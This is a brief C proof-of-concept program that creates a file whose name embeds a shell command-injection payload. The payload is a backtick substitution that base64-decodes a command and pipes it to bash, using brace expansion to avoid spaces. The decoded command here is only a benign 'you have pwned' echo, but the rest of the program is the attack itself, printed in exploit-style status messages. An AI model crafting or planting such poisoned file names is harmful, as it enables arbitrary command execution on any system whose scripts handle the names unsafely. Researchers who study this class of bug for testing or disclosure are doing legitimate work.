#include <fcntl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>

int main() {
    const char *filename = "poc.txt`{echo,ZWNobyAieW91IGhhdmUgcHduZWQgWytdISAi}|{base64,-d}|bash`";
    int fd;

    printf("[*] Target filename: %s\n", filename);

    // Call syscall directly
    printf("[*] Calling syscall(SYS_openat)...\n");
    fd = syscall(SYS_openat, AT_FDCWD, filename,
                 O_CREAT | O_WRONLY, 0644);

    if (fd < 0) {
        printf("[!] Failed to create file: %s\n", strerror(errno));
        return 1;
    }

    printf("[+] File created successfully! fd=%d\n", fd);

    const char *data = "h4x0r_dz\n";
    ssize_t written = write(fd, data, strlen(data));
    if (written < 0) {
        printf("[!] Failed to write to file: %s\n", strerror(errno));
        close(fd);
        return 1;
    }

    printf("[+] Wrote %zd bytes to file.\n", written);

    if (close(fd) < 0) {
        printf("[!] Failed to close file: %s\n", strerror(errno));
        return 1;
    }

    printf("[+] File closed successfully.\n");
    printf("[*] Done.\n");

    return 0;
}
